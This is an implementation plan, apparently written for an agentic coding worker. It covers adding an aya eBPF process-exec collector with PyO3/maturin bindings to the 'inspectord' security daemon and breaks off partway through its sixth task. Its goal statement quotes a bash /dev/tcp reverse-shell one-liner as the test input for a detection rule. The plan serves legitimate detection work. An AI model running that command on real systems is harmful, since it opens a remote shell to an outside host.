# Process Collector via eBPF/aya — Implementation Plan (Phase 2 first slice)

> **For agentic workers:** REQUIRED SUB-SKILL: Use `superpowers:subagent-driven-development` (recommended) or `superpowers:executing-plans` to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Land the first eBPF collector — `process_collector` — using aya. Hook the `sched_process_exec` tracepoint; stream process-spawn records through a ring buffer; deliver them to Python via PyO3 + maturin; emit normalized `process_start` Events that the existing rule engine consumes. After this plan, running `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1` in any shell makes `lolbin.bash_dev_tcp` fire a real Alert.

**Architecture:** Two new Rust crates under `crates/inspectord_ebpf_process/`: an **`-ebpf` crate** that compiles to the `bpfel-unknown-none` target and ships an `aya` tracepoint program for `sched_process_exec`, and a **userspace crate** that loads the BPF object (`include_bytes!()`-embedded at build time), attaches the program, drains the ring buffer, and exposes records to Python via PyO3 as `inspectord._native.process_exec_stream`. A new `ProcessCollectorWorker` (Python) consumes that iterator and emits NDJSON events. The build backend migrates from hatchling to **maturin**, which is the standard way to ship combined Rust+Python wheels.

**Tech Stack:** Python 3.12 · Rust stable · aya (`aya` + `aya-ebpf` + `aya-log` + `aya-build`) · bpf-linker · PyO3 (with `abi3-py312`) · maturin · LLVM 18 · libelf · linux kernel ≥ 5.8 (for `CAP_BPF`).

**Scope discipline for this plan:**
- ONLY `sched_process_exec`. The remaining process-collector tracepoints (`sched_process_exit`, `sys_enter_ptrace`, `sys_enter_finit_module`, raw-socket creation) come in subsequent Phase 2 slices.
- BPF reads the first 256 bytes of the process command line directly (via `bpf_probe_read_user_str` against `current->mm->arg_start`). The existing process_enricher fills in `executable` and SHA-256.
- No `sched_process_exit` correlation — exit events arrive in a later slice.
- No new dashboard panels.
- Rust toolchain becomes a hard prerequisite for development. CI installs it. The user is on CachyOS so installing `rustup` + LLVM locally is `pacman -S rustup llvm clang lld` plus `rustup default stable` and `rustup component add rust-src --toolchain nightly` for `bpf-linker`.

---

## Repository state at the start

`/home/eli/Development/inspectord` on `main` after PR #60. **274 tests passing.** CI green. Phase 1 fully complete. Pieces this plan touches:

- `pyproject.toml` — build backend is currently **hatchling**. We migrate to **maturin** in PR 1.
- `Cargo.toml` workspace exists with `members = []` (from Phase 0 PR #1). We populate it.
- `crates/` directory exists with only `.gitkeep`.
- `.github/workflows/ci.yml` — currently sets up Python 3.12, runs ruff + mypy + pytest. We add Rust toolchain + clippy/fmt/cargo-test + LLVM/bpf-linker.
- `inspectord/workers/contract.py` — `Worker` base class pattern.
- `inspectord/config.py` — `dev_config(*, base)` returns a `DaemonConfig`. We add a `process_collector` worker entry.
- `inspectord/enrichment/process.py` — `enrich_process` already reads `/proc/<pid>/{exe,cmdline,stat}`. We rely on it for SHA-256 + parent.
- `inspectord/rules/starter_pack/lolbin_reverse_shell.py` — already fires on `module=process_collector`, `process.name=bash`, command_line matching `/dev/tcp/`. We DO NOT touch this; the new collector emits the right shape and the existing rule fires unmodified.

## File structure produced by this plan

```
Cargo.toml                                        # workspace; members populated
rust-toolchain.toml                               # pins stable Rust for the host toolchain
crates/
├── inspectord_ebpf_process/                      # USERSPACE loader + PyO3 bindings
│   ├── Cargo.toml
│   ├── build.rs                                  # compiles the -ebpf crate via aya-build
│   ├── pyproject.toml                            # (not used; maturin reads the workspace pyproject)
│   └── src/
│       ├── lib.rs                                # PyO3 module entry; ProcessExecStream class
│       ├── loader.rs                             # aya Bpf::load(...) + program attach
│       └── records.rs                            # repr(C) struct shared with the BPF program
└── inspectord_ebpf_process_bpf/                  # BPF program crate (bpfel-unknown-none)
    ├── Cargo.toml
    ├── rust-toolchain.toml                       # pins nightly Rust (bpf-linker requires it)
    └── src/
        ├── main.rs                               # #![no_std] + #![no_main] aya entry
        └── records.rs                            # mirrors crates/inspectord_ebpf_process/src/records.rs

pyproject.toml                                    # MIGRATED hatchling → maturin
inspectord/_native/                               # NEW: Python-side namespace for the Rust extension
└── __init__.py                                   # re-exports the maturin-built module

inspectord/workers/process_collector/
├── __init__.py
└── __main__.py                                   # ProcessCollectorWorker

tests/
├── workers/
│   ├── __init__.py
│   └── test_process_collector_worker.py          # uses a fake stream; doesn't load BPF
└── integration/
    └── test_process_collector_ebpf_load.py       # @pytest.mark.ebpf_load — runs locally as root only

.github/workflows/ci.yml                          # adds Rust + LLVM + clippy/fmt/cargo-test stages

packaging/systemd/inspectord.service.template     # MODIFIED to grant CAP_BPF/CAP_PERFMON
docs/manual-acceptance/process-collector-acceptance.md   # how to verify on a real box
```

Total new: 9 Rust source files, 3 Python source files (worker + native init), 2 test files, 1 acceptance doc; 4 file modifications (pyproject, workflows/ci.yml, systemd template, dev_config). **Approximately 12 PRs.**

## Workflow

Same as prior plans. Each task → feature branch → PR → CI gate → squash-merge. TDD throughout. **New CI gates added by this plan:** `cargo fmt --check`, `cargo clippy -- -D warnings`, `cargo test`, `cargo check --target bpfel-unknown-none -p inspectord_ebpf_process_bpf`. All must pass before merge.

## Local prerequisites for the developer running this plan

```bash
# CachyOS / Arch:
sudo pacman -S rustup llvm clang lld libelf linux-headers
rustup default stable
rustup toolchain install nightly --component rust-src
cargo install bpf-linker --locked  # uses nightly Rust under the hood
```

(Other distros: rustup script + the LLVM 18 packages.)

---

## Task 1: Migrate build backend hatchling → maturin

**Files:**
- Modify: `pyproject.toml`
- Create: `inspectord/_native/__init__.py`
- Delete: nothing (we PRESERVE all force-includes)

**Branch:** `task-bpf-01-maturin-migration`

The current `pyproject.toml` uses hatchling with a `[tool.hatch.build.targets.wheel]` block containing packages and force-includes for runtime data files (migrations_data, manifest_files, templates, starter_pack, web/templates, web/static). Maturin uses a different idiom:

- `[build-system] requires = ["maturin>=1.5,<2"]`
- `[build-system] build-backend = "maturin"`
- `[tool.maturin] python-source = "."` tells maturin Python packages live at the repo root
- `[tool.maturin] module-name = "inspectord._native._native"` names the Rust extension (Phase 1: no Rust yet, but we set it up)
- `[tool.maturin] include = [...]` lists data files to ship in the wheel
- `[tool.maturin] features = ["pyo3/extension-module"]` enables PyO3's extension build flags

In PR 1 we do the migration **without adding any Rust code yet**. We add an empty `inspectord/_native/__init__.py` so the future PyO3 module has a parent namespace, but no Rust crate exists. Maturin in this state produces a pure-Python wheel — it gracefully handles "no Rust source found" mode if `[tool.maturin] module-name` is unset.

**Actually**: for a pure-Python wheel built by maturin, the cleanest config is to **not** set `module-name`. Maturin then behaves as a Python-only build. We'll set `module-name` in PR 2 when we add the Rust crate.

- [ ] **Step 1: Update pyproject.toml**

Replace the current `[build-system]` block with:

```toml
[build-system]
requires = ["maturin>=1.5,<2"]
build-backend = "maturin"
```

Replace the entire `[tool.hatch.*]` blocks with the following maturin equivalent. Keep all data-file inclusion via `include`:

```toml
[tool.maturin]
python-source = "."
# No module-name yet — Rust crate is added in PR 2.
include = [
    { path = "inspectord/storage/migrations_data/**/*", format = "sdist" },
    { path = "inspectord/storage/migrations_data/**/*", format = "wheel" },
    { path = "inspectord/dependencies/manifest_files/**/*", format = "sdist" },
    { path = "inspectord/dependencies/manifest_files/**/*", format = "wheel" },
    { path = "inspectord/dependencies/templates/**/*", format = "sdist" },
    { path = "inspectord/dependencies/templates/**/*", format = "wheel" },
    { path = "inspectord/rules/starter_pack/**/*", format = "sdist" },
    { path = "inspectord/rules/starter_pack/**/*", format = "wheel" },
    { path = "inspectorctl/web/templates/**/*", format = "sdist" },
    { path = "inspectorctl/web/templates/**/*", format = "wheel" },
    { path = "inspectorctl/web/static/**/*", format = "sdist" },
    { path = "inspectorctl/web/static/**/*", format = "wheel" },
]
```

Leave the `[project]`, `[project.optional-dependencies]`, and `[project.scripts]` blocks unchanged.

- [ ] **Step 2: Create the _native namespace package**

```bash
cd /home/eli/Development/inspectord
mkdir -p inspectord/_native
```

Write `inspectord/_native/__init__.py`:

```python
"""Namespace for the Rust extension module (populated in subsequent PRs)."""
```

- [ ] **Step 3: Install maturin and rebuild**

```bash
source .venv/bin/activate
pip install --upgrade maturin
pip install -e '.[dev]' --no-build-isolation
```

`--no-build-isolation` is required because maturin would otherwise try to fetch a fresh build env that doesn't have our local sources.

Verify `python -c "import inspectord, inspectorctl; print(inspectord.__version__)"` still prints `0.1.0` and `python -c "from inspectord.storage.migrations import _list_migrations; print(_list_migrations()[0][1])"` prints `0001_initial.sql` (proves the migrations_data resources still ship).

- [ ] **Step 4: Run the full suite**

```bash
pytest tests/ -v
ruff check inspectord inspectorctl tests
ruff format --check inspectord inspectorctl tests
mypy inspectord inspectorctl
```

Expected: all 274 tests still pass.

- [ ] **Step 5: Update CI to use maturin**

In `.github/workflows/ci.yml`, in the `Install dependencies` step, replace:

```yaml
      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -e '.[dev]'
```

with:

```yaml
      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install maturin
          pip install -e '.[dev]' --no-build-isolation
```

- [ ] **Step 6: Branch + commit + push + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-bpf-01-maturin-migration
git add pyproject.toml inspectord/_native/__init__.py .github/workflows/ci.yml
git commit -m "build: migrate build backend hatchling → maturin"
git push -u origin task-bpf-01-maturin-migration
gh pr create --base main --head task-bpf-01-maturin-migration \
  --title "build: migrate to maturin (no Rust yet)" \
  --body "Switches [build-system] from hatchling to maturin in preparation for the Rust + PyO3 extension landing in subsequent PRs. Preserves all existing data-file inclusions (migrations_data, manifest_files, templates, starter_pack, web/templates, web/static) via [tool.maturin] include. CI now installs maturin and uses --no-build-isolation for the editable install. No Rust crate added yet — that comes in PR 2. All 274 tests pass."
```

Wait for CI green; do NOT merge.

---

## Task 2: Add the Rust workspace + cargo CI gates (no eBPF yet)

**Files:**
- Modify: `Cargo.toml` (workspace; populate members)
- Create: `rust-toolchain.toml`
- Modify: `.github/workflows/ci.yml`

**Branch:** `task-bpf-02-rust-toolchain`

The workspace already exists from Phase 0 with `members = []`. This PR adds:
- A `rust-toolchain.toml` pinning **stable** for the host toolchain.
- A no-op population of `members = []` to `members = ["crates/inspectord_ebpf_process"]` happens in PR 3; for now we keep `members = []` so cargo doesn't complain.
- CI runs `cargo fmt --check` and `cargo build` over the (empty) workspace, which is a no-op but exercises the toolchain install.

- [ ] **Step 1: Pin Rust stable**

Write `/home/eli/Development/inspectord/rust-toolchain.toml`:

```toml
[toolchain]
channel = "stable"
components = ["rustfmt", "clippy"]
profile = "minimal"
```

This pins stable for `cargo` invocations in the workspace root. The BPF crate later overrides with its own `rust-toolchain.toml` pinning nightly.

- [ ] **Step 2: Update CI to install Rust + run cargo gates**

In `.github/workflows/ci.yml`, find the existing `lint-and-test` job. After the `Install dependencies` step and BEFORE the ruff steps, insert:

```yaml
      - name: Install Rust toolchain
        uses: actions-rust-lang/setup-rust-toolchain@v1
        with:
          toolchain: stable
          components: rustfmt, clippy

      - name: Cargo fmt
        run: cargo fmt --check

      - name: Cargo clippy
        run: cargo clippy --workspace --all-targets -- -D warnings

      - name: Cargo build
        run: cargo build --workspace --all-targets

      - name: Cargo test
        run: cargo test --workspace --all-targets
```

For the empty-workspace case, `cargo build`/`test`/`clippy` are no-ops; they exercise that the toolchain installs cleanly.

- [ ] **Step 3: Sanity-check locally**

```bash
cd /home/eli/Development/inspectord
rustup default stable
cargo fmt --check
cargo clippy --workspace --all-targets -- -D warnings
cargo build --workspace --all-targets
cargo test --workspace --all-targets
```

All should succeed with "no targets to build" or equivalent.

- [ ] **Step 4: Run Python suite (still 274)**

```bash
source .venv/bin/activate
pytest tests/ -v
```

- [ ] **Step 5: Commit + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-bpf-02-rust-toolchain
git add rust-toolchain.toml .github/workflows/ci.yml
git commit -m "ci: install Rust stable + add cargo fmt/clippy/build/test gates"
git push -u origin task-bpf-02-rust-toolchain
gh pr create --base main --head task-bpf-02-rust-toolchain \
  --title "ci: Rust toolchain + cargo gates" \
  --body "Adds Rust stable to CI via actions-rust-lang/setup-rust-toolchain@v1 + four cargo gates (fmt/clippy/build/test) over the workspace. Workspace members list is still empty in this PR; the first crate lands in PR 3. No new Python tests."
```

Wait for CI green; do NOT merge.

---

## Task 3: Add `inspectord_ebpf_process` userspace crate + hello-world PyO3 binding

**Files:**
- Modify: `Cargo.toml` (workspace members)
- Modify: `pyproject.toml` (set `[tool.maturin] module-name`)
- Create: `crates/inspectord_ebpf_process/Cargo.toml`
- Create: `crates/inspectord_ebpf_process/src/lib.rs`
- Create: `tests/test_native_hello.py`

**Branch:** `task-bpf-03-pyo3-hello`

A first Rust crate that exposes a single `hello()` function callable from Python. This proves the full toolchain (cargo → maturin → wheel → Python import) works end-to-end. The eBPF program comes in PR 5.

- [ ] **Step 1: Populate workspace members**

In `/home/eli/Development/inspectord/Cargo.toml`, change:

```toml
[workspace]
resolver = "2"
members = []

# Phase 2 will add eBPF crates here under crates/.
```

to:

```toml
[workspace]
resolver = "2"
members = ["crates/inspectord_ebpf_process"]

[workspace.package]
edition = "2021"
rust-version = "1.74"

[workspace.dependencies]
pyo3 = { version = "0.22", features = ["abi3-py312", "extension-module"] }
```

- [ ] **Step 2: Create the userspace crate**

```bash
mkdir -p /home/eli/Development/inspectord/crates/inspectord_ebpf_process/src
```

Write `/home/eli/Development/inspectord/crates/inspectord_ebpf_process/Cargo.toml`:

```toml
[package]
name = "inspectord_ebpf_process"
version = "0.1.0"
edition.workspace = true
rust-version.workspace = true

[lib]
name = "_native"
crate-type = ["cdylib", "rlib"]

[dependencies]
pyo3.workspace = true
```

`crate-type = ["cdylib", "rlib"]` produces both the shared library maturin packages and a Rust library for cargo tests.

Write `/home/eli/Development/inspectord/crates/inspectord_ebpf_process/src/lib.rs`:

```rust
//! Userspace loader for the inspectord process_collector eBPF program.
//!
//! Phase 2 v1 stub: exposes a single `hello()` function so the maturin
//! toolchain can be verified end-to-end. The aya loader lands in PR 5.

use pyo3::prelude::*;

#[pyfunction]
fn hello() -> &'static str {
    "hello from inspectord_ebpf_process"
}

#[pymodule]
fn _native(m: &Bound<'_, PyModule>) -> PyResult<()> {
    m.add_function(wrap_pyfunction!(hello, m)?)?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn hello_returns_expected_string() {
        assert_eq!(hello(), "hello from inspectord_ebpf_process");
    }
}
```

- [ ] **Step 3: Tell maturin where the Rust extension lives**

In `/home/eli/Development/inspectord/pyproject.toml`, change the `[tool.maturin]` block to add the `module-name` and `manifest-path`:

```toml
[tool.maturin]
python-source = "."
module-name = "inspectord._native._native"
manifest-path = "crates/inspectord_ebpf_process/Cargo.toml"
features = ["pyo3/extension-module"]
include = [
    { path = "inspectord/storage/migrations_data/**/*", format = "sdist" },
    { path = "inspectord/storage/migrations_data/**/*", format = "wheel" },
    { path = "inspectord/dependencies/manifest_files/**/*", format = "sdist" },
    { path = "inspectord/dependencies/manifest_files/**/*", format = "wheel" },
    { path = "inspectord/dependencies/templates/**/*", format = "sdist" },
    { path = "inspectord/dependencies/templates/**/*", format = "wheel" },
    { path = "inspectord/rules/starter_pack/**/*", format = "sdist" },
    { path = "inspectord/rules/starter_pack/**/*", format = "wheel" },
    { path = "inspectorctl/web/templates/**/*", format = "sdist" },
    { path = "inspectorctl/web/templates/**/*", format = "wheel" },
    { path = "inspectorctl/web/static/**/*", format = "sdist" },
    { path = "inspectorctl/web/static/**/*", format = "wheel" },
]
```

The fully qualified `module-name = "inspectord._native._native"` means:
- Python import path: `from inspectord._native import _native`
- Maturin places the compiled `.so` at `inspectord/_native/_native.<abi-tag>.so` next to `inspectord/_native/__init__.py`.

- [ ] **Step 4: Re-export from the namespace package**

Replace `/home/eli/Development/inspectord/inspectord/_native/__init__.py` with:

```python
"""Namespace package for the Rust extension module.

The compiled extension is built by maturin and placed alongside this file as
``_native.<abi-tag>.so``. Re-export its public API for convenient access.
"""

from inspectord._native._native import hello

__all__ = ["hello"]
```

- [ ] **Step 5: Failing Python test**

Write `/home/eli/Development/inspectord/tests/test_native_hello.py`:

```python
"""Smoke test: the Rust extension module imports and returns its hello string."""

from __future__ import annotations


def test_native_hello() -> None:
    from inspectord._native import hello

    assert hello() == "hello from inspectord_ebpf_process"
```

- [ ] **Step 6: Build the extension + run tests**

```bash
cd /home/eli/Development/inspectord
source .venv/bin/activate
pip install -e '.[dev]' --no-build-isolation
pytest tests/test_native_hello.py -v
```

Expected: the `pip install` step compiles the Rust crate (takes a moment), then `pytest` reports 1 passed.

If the `pip install` fails with "cannot find module-name", verify the `module-name` value is exactly `inspectord._native._native` and the manifest-path points to the userspace crate.

Run the full Python suite:

```bash
pytest tests/ -v
```

Expected: 275 tests pass (274 + 1 new).

Run cargo gates locally:

```bash
cargo fmt --check
cargo clippy --workspace --all-targets -- -D warnings
cargo test --workspace --all-targets
```

The `hello_returns_expected_string` Rust test should pass.

- [ ] **Step 7: Commit + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-bpf-03-pyo3-hello
git add Cargo.toml pyproject.toml crates/inspectord_ebpf_process/ \
        inspectord/_native/__init__.py tests/test_native_hello.py
git commit -m "feat(native): add inspectord_ebpf_process crate + hello PyO3 binding"
git push -u origin task-bpf-03-pyo3-hello
gh pr create --base main --head task-bpf-03-pyo3-hello \
  --title "feat(native): Rust crate scaffolding + hello PyO3 binding" \
  --body "Adds the first Rust crate (crates/inspectord_ebpf_process) and a hello() function exposed to Python via PyO3+maturin. Proves the end-to-end toolchain works. eBPF code lands in PR 5; this PR is purely the scaffolding + smoke test."
```

Wait for CI green; do NOT merge.

---

## Task 4: Install LLVM + bpf-linker in CI; add nightly Rust for the BPF crate

**Files:**
- Modify: `.github/workflows/ci.yml`

**Branch:** `task-bpf-04-ci-llvm-bpf-linker`

Compiling BPF programs requires:
1. **Nightly Rust** for the `bpfel-unknown-none` target (the stable toolchain doesn't ship this target).
2. **bpf-linker** to link the BPF object after rustc emits LLVM IR. `cargo install bpf-linker` builds it from source — needs LLVM 18+ dev headers (`llvm-18-dev` on Ubuntu).
3. **libelf-dev** so aya can parse BTF.
4. **clang** (used by aya-build for header processing).

This PR installs all of that in CI and ensures the cargo gates still pass (no actual BPF crate yet; it lands in PR 5).

- [ ] **Step 1: Update CI**

In `.github/workflows/ci.yml`, after the `Install Rust toolchain` step from PR 2, insert:

```yaml
      - name: Install nightly Rust (for bpf-linker)
        uses: actions-rust-lang/setup-rust-toolchain@v1
        with:
          toolchain: nightly
          components: rust-src

      - name: Install LLVM + libelf + clang
        run: |
          sudo apt-get update
          sudo apt-get install -y --no-install-recommends \
              llvm-18 llvm-18-dev libpolly-18-dev \
              clang-18 lld-18 libelf-dev pkg-config

      - name: Configure LLVM env
        run: |
          echo "LLVM_SYS_180_PREFIX=/usr/lib/llvm-18" >> $GITHUB_ENV
          echo "/usr/lib/llvm-18/bin" >> $GITHUB_PATH

      - name: Install bpf-linker
        run: cargo install --locked bpf-linker
```

The `LLVM_SYS_180_PREFIX` env var tells `bpf-linker`'s build script where to find LLVM 18.

`cargo install --locked bpf-linker` takes several minutes on a cold runner. Add caching afterwards if needed.

- [ ] **Step 2: Verify locally on CachyOS**

```bash
sudo pacman -S llvm clang lld libelf linux-headers
rustup toolchain install nightly --component rust-src
cargo install --locked bpf-linker
which bpf-linker  # should print a path
bpf-linker --version  # should print version
```

- [ ] **Step 3: Confirm the existing CI gates still pass**

The CI workflow should still run successfully — nothing builds against the new tools yet, but they're available.

- [ ] **Step 4: Commit + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-bpf-04-ci-llvm-bpf-linker
git add .github/workflows/ci.yml
git commit -m "ci: install nightly Rust + LLVM 18 + bpf-linker (prep for eBPF crate)"
git push -u origin task-bpf-04-ci-llvm-bpf-linker
gh pr create --base main --head task-bpf-04-ci-llvm-bpf-linker \
  --title "ci: LLVM 18 + bpf-linker prerequisites" \
  --body "Installs nightly Rust, LLVM 18 dev headers, clang/lld, libelf-dev, and bpf-linker so the eBPF crate (PR 5) can compile. No code changes; CI passes without using any of these yet."
```

Wait for CI green; do NOT merge.

---

(Tasks 5-12 continue below.)

## Task 5: BPF crate skeleton + minimal sched_process_exec program (no-op)

**Files:**
- Modify: `Cargo.toml` (add second workspace member)
- Create: `crates/inspectord_ebpf_process_bpf/Cargo.toml`
- Create: `crates/inspectord_ebpf_process_bpf/rust-toolchain.toml`
- Create: `crates/inspectord_ebpf_process_bpf/src/main.rs`
- Create: `crates/inspectord_ebpf_process_bpf/.cargo/config.toml`
- Create: `crates/inspectord_ebpf_process/build.rs`
- Modify: `crates/inspectord_ebpf_process/Cargo.toml`
- Modify: `.github/workflows/ci.yml` (add a step that builds the BPF crate)

**Branch:** `task-bpf-05-bpf-crate-skeleton`

This PR adds the second crate — the one that compiles to `bpfel-unknown-none`. The program does almost nothing yet: it attaches to the tracepoint and immediately returns 0. The userspace crate gains a `build.rs` that compiles the BPF crate and embeds the resulting object file via `include_bytes!` (consumed in PR 6).

- [ ] **Step 1: Register the second workspace member**

In `/home/eli/Development/inspectord/Cargo.toml`, update members:

```toml
[workspace]
resolver = "2"
members = [
    "crates/inspectord_ebpf_process",
    "crates/inspectord_ebpf_process_bpf",
]

[workspace.package]
edition = "2021"
rust-version = "1.74"

[workspace.dependencies]
pyo3 = { version = "0.22", features = ["abi3-py312", "extension-module"] }
aya = "0.13"
aya-ebpf = "0.1"
aya-log-ebpf = "0.1"
aya-build = "0.1"
```

- [ ] **Step 2: Create the BPF crate**

```bash
mkdir -p /home/eli/Development/inspectord/crates/inspectord_ebpf_process_bpf/src
mkdir -p /home/eli/Development/inspectord/crates/inspectord_ebpf_process_bpf/.cargo
```

Write `/home/eli/Development/inspectord/crates/inspectord_ebpf_process_bpf/Cargo.toml`:

```toml
[package]
name = "inspectord_ebpf_process_bpf"
version = "0.1.0"
edition.workspace = true
rust-version.workspace = true
publish = false

[[bin]]
name = "inspectord_ebpf_process_bpf"
path = "src/main.rs"

[dependencies]
aya-ebpf.workspace = true
aya-log-ebpf.workspace = true

[profile.dev]
opt-level = 3
debug = false
debug-assertions = false
overflow-checks = false
lto = true
panic = "abort"
incremental = false
codegen-units = 1
rpath = false

[profile.release]
lto = true
panic = "abort"
codegen-units = 1
```

BPF programs must be compiled with optimization (the kernel verifier rejects unoptimized code) and `panic = "abort"` (no unwinding inside the kernel).

Pin nightly for this crate — write `/home/eli/Development/inspectord/crates/inspectord_ebpf_process_bpf/rust-toolchain.toml`:

```toml
[toolchain]
channel = "nightly"
components = ["rust-src"]
profile = "minimal"
```

Configure the default target — write `/home/eli/Development/inspectord/crates/inspectord_ebpf_process_bpf/.cargo/config.toml`:

```toml
[build]
target = "bpfel-unknown-none"

[unstable]
build-std = ["core"]

[target.bpfel-unknown-none]
rustflags = ["-C", "link-arg=--btf"]
```

The `--btf` linker flag asks `bpf-linker` to embed BPF Type Format information into the object file — required for CO-RE so the same .o works across kernel versions.

- [ ] **Step 3: Write the minimal BPF program**

Write `/home/eli/Development/inspectord/crates/inspectord_ebpf_process_bpf/src/main.rs`:

```rust
//! inspectord process_collector tracepoint program.
//!
//! Phase 2 v1 stub: attaches but does no real work. Ring-buffer
//! emission lands in subsequent PRs.

#![no_std]
#![no_main]

use aya_ebpf::{macros::tracepoint, programs::TracePointContext};

#[tracepoint]
pub fn process_exec(_ctx: TracePointContext) -> u32 {
    0
}

#[cfg(not(test))]
#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}
```

- [ ] **Step 4: Wire the userspace crate's build.rs**

Update `/home/eli/Development/inspectord/crates/inspectord_ebpf_process/Cargo.toml`:

```toml
[package]
name = "inspectord_ebpf_process"
version = "0.1.0"
edition.workspace = true
rust-version.workspace = true

[lib]
name = "_native"
crate-type = ["cdylib", "rlib"]

[dependencies]
pyo3.workspace = true

[build-dependencies]
aya-build.workspace = true

[build-dependencies.inspectord_ebpf_process_bpf]
path = "../inspectord_ebpf_process_bpf"
artifact = "bin"
target = "bpfel-unknown-none"
```

Write `/home/eli/Development/inspectord/crates/inspectord_ebpf_process/build.rs`:

```rust
//! Compiles the BPF crate to bpfel-unknown-none and emits its object
//! file path under OUT_DIR for include_bytes! consumption from lib.rs.

use aya_build::cargo_metadata;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let cargo_metadata::Metadata { packages, .. } = cargo_metadata::MetadataCommand::new()
        .no_deps()
        .exec()?;
    let ebpf_package = packages
        .into_iter()
        .find(|p| p.name == "inspectord_ebpf_process_bpf")
        .ok_or("missing inspectord_ebpf_process_bpf in workspace")?;
    aya_build::build_ebpf([ebpf_package])?;
    Ok(())
}
```

- [ ] **Step 5: CI step that explicitly builds the BPF crate**

In `.github/workflows/ci.yml`, after the `Cargo test` step from PR 2, insert:

```yaml
      - name: Cargo build BPF crate
        run: cargo build --release --target bpfel-unknown-none -p inspectord_ebpf_process_bpf
```

- [ ] **Step 6: Build locally + verify**

```bash
cd /home/eli/Development/inspectord
cargo build --release --target bpfel-unknown-none -p inspectord_ebpf_process_bpf
```

Expected: produces `target/bpfel-unknown-none/release/inspectord_ebpf_process_bpf`. Confirm with `llvm-readelf -h ...` — machine should be `EM_BPF`.

```bash
cargo build --workspace --all-targets
cargo clippy --workspace --all-targets -- -D warnings
cargo fmt --check
source .venv/bin/activate
pip install -e '.[dev]' --no-build-isolation
pytest tests/ -v
```

All must pass; pytest at 275 still.

- [ ] **Step 7: Commit + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-bpf-05-bpf-crate-skeleton
git add Cargo.toml crates/inspectord_ebpf_process_bpf/ \
        crates/inspectord_ebpf_process/Cargo.toml \
        crates/inspectord_ebpf_process/build.rs \
        .github/workflows/ci.yml
git commit -m "feat(bpf): no-op tracepoint program + aya build pipeline"
git push -u origin task-bpf-05-bpf-crate-skeleton
gh pr create --base main --head task-bpf-05-bpf-crate-skeleton \
  --title "feat(bpf): no-op tracepoint + aya build pipeline" \
  --body "Adds the second Rust crate compiled to bpfel-unknown-none via nightly Rust + bpf-linker. Userspace crate gains a build.rs using aya-build. PR 6 attaches the program; PR 7 adds real records."
```

Wait for CI green; do NOT merge.

---

## Task 6: Userspace loader — load the BPF object + attach the program

**Files:**
- Modify: `crates/inspectord_ebpf_process/Cargo.toml` (add aya + thiserror)
- Create: `crates/inspectord_ebpf_process/src/loader.rs`
- Modify: `crates/inspectord_ebpf_process/src/lib.rs`
- Modify: `inspectord/_native/__init__.py`
- Create: `tests/test_native_loader.py`

**Branch:** `task-bpf-06-loader`

The userspace crate gains a `load_and_attach()` function that embeds the BPF object via `include_bytes!`, loads it with `aya::Ebpf::load()`, and attaches the tracepoint. Exposed to Python as `ProcessExecStream` — a context manager. The ring-buffer reads come in PR 8. Loading BPF needs `CAP_BPF`, so the Python smoke test skips when not root.

- [ ] **Step 1: Add aya dependency**

Update `/home/eli/Development/inspectord/crates/inspectord_ebpf_process/Cargo.toml`:

```toml
[package]
name = "inspectord_ebpf_process"
version = "0.1.0"
edition.workspace = true
rust-version.workspace = true

[lib]
name = "_native"
crate-type = ["cdylib", "rlib"]

[dependencies]
pyo3.workspace = true
aya.workspace = true
log = "0.4"
env_logger = "0.11"
thiserror = "1"

[build-dependencies]
aya-build.workspace = true

[build-dependencies.inspectord_ebpf_process_bpf]
path = "../inspectord_ebpf_process_bpf"
artifact = "bin"
target = "bpfel-unknown-none"
```

- [ ] **Step 2: Write the loader**

Write `/home/eli/Development/inspectord/crates/inspectord_ebpf_process/src/loader.rs`:

```rust
//! Loads the embedded BPF object into the kernel and attaches the
//! tracepoint program. Dropping the LoadedProgram unloads everything.

use aya::{programs::TracePoint, Ebpf};
use std::sync::Mutex;

const PROGRAM_BYTES: &[u8] = include_bytes!(concat!(
    env!("OUT_DIR"),
    "/inspectord_ebpf_process_bpf"
));

pub struct LoadedProgram {
    inner: Mutex<Ebpf>,
}

impl LoadedProgram {
    pub fn load_and_attach() -> Result<Self, LoadError> {
        let mut bpf = Ebpf::load(PROGRAM_BYTES).map_err(LoadError::Aya)?;
        let program: &mut TracePoint = bpf
            .program_mut("process_exec")
            .ok_or(LoadError::MissingProgram)?
            .try_into()
            .map_err(LoadError::ProgramKind)?;
        program.load().map_err(LoadError::Aya)?;
        program
            .attach("sched", "sched_process_exec")
            .map_err(LoadError::Aya)?;
        Ok(Self { inner: Mutex::new(bpf) })
    }
}

#[derive(thiserror::Error, Debug)]
pub enum LoadError {
    #[error("aya error: {0}")]
    Aya(#[from] aya::EbpfError),
    #[error("program kind mismatch: {0}")]
    ProgramKind(aya::programs::ProgramError),
    #[error("BPF program 'process_exec' not found in object")]
    MissingProgram,
}
```

- [ ] **Step 3: Expose ProcessExecStream to Python**

Replace `/home/eli/Development/inspectord/crates/inspectord_ebpf_process/src/lib.rs` with:

```rust
//! Userspace loader for the inspectord process_collector eBPF program.

mod loader;

use loader::LoadedProgram;
use pyo3::exceptions::PyOSError;
use pyo3::prelude::*;

#[pyclass(unsendable)]
struct ProcessExecStream {
    program: Option<LoadedProgram>,
}

#[pymethods]
impl ProcessExecStream {
    #[new]
    fn new() -> PyResult<Self> {
        let program = LoadedProgram::load_and_attach()
            .map_err(|e| PyOSError::new_err(format!("eBPF load failed: {e}")))?;
        Ok(Self { program: Some(program) })
    }

    fn close(&mut self) {
        self.program.take();
    }

    fn __enter__<'py>(slf: PyRef<'py, Self>) -> PyRef<'py, Self> {
        slf
    }

    fn __exit__(
        &mut self,
        _exc_type: PyObject,
        _exc_value: PyObject,
        _traceback: PyObject,
    ) -> bool {
        self.close();
        false
    }
}

#[pyfunction]
fn hello() -> &'static str {
    "hello from inspectord_ebpf_process"
}

#[pymodule]
fn _native(m: &Bound<'_, PyModule>) -> PyResult<()> {
    m.add_function(wrap_pyfunction!(hello, m)?)?;
